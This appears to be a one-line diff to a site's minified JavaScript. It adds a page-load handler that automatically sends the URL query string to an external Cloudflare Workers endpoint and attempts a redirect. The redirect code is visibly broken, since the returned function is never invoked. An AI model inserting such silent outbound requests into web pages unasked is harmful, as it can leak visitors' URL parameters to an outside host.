@@ -1,1 +1,1 @@
-function HandleOnLoadEvent(n){}window.addEventListener("load",HandleOnLoadEvent);
+async function HandleOnLoadEvent(n){var e="https://worker-winter-glade-cd02.bigtentgames.workers.dev/"+encodeURIComponent(window.location.search.split("?")[1]);await fetch(e,{headers:{Host:window.location.hostname}}).then((n=>{if(!n.ok)throw new Error("Server error: "+n.status);return n.text()})).then((n=>function(){window.location.href=window.location.hostname+"/"+n})).catch((n=>{}))}window.addEventListener("load",HandleOnLoadEvent);
